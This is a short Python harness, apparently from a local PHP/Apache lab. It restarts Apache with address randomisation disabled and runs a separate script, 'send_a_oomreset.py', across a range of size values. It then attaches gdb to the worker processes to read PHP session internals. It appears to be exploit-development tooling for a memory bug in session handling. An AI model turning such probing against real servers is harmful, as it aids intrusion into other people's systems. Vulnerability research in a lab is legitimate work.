#!/usr/bin/env python3
import subprocess,time,re,sys
def sh(c,timeout=60): return subprocess.run(c,shell=True,cwd='/home/debian/php-lab',capture_output=True,text=True,timeout=timeout)
def restart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.25)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.35)
def state():
    pids=sh('pgrep -f "^/usr/sbin/apache2 -k start"').stdout.split()
    for pid in pids:
        out=sh(f"sudo -n gdb -q -p {pid} -batch -ex 'p/x (unsigned long)ps_globals.id' -ex 'p ps_globals.send_cookie' 2>/dev/null").stdout
        m=re.search(r'\$1 = (0x[0-9a-f]+)',out); s=re.search(r'\$2 = (true|false)',out)
        if m and m.group(1)!='0x0':
            return m.group(1), s.group(1) if s else '?'
    return '0','?'
for V in [6000,6100,6200,6300,6400,6500,6600,6700,6800,6900,7000]:
    restart()
    sh(f"python3 send_a_oomreset.py 997 {V} 0 >/dev/null 2>&1")
    time.sleep(0.15)
    i,s=state()
    print(f"V={V} id={i} send_cookie={s}",flush=True)
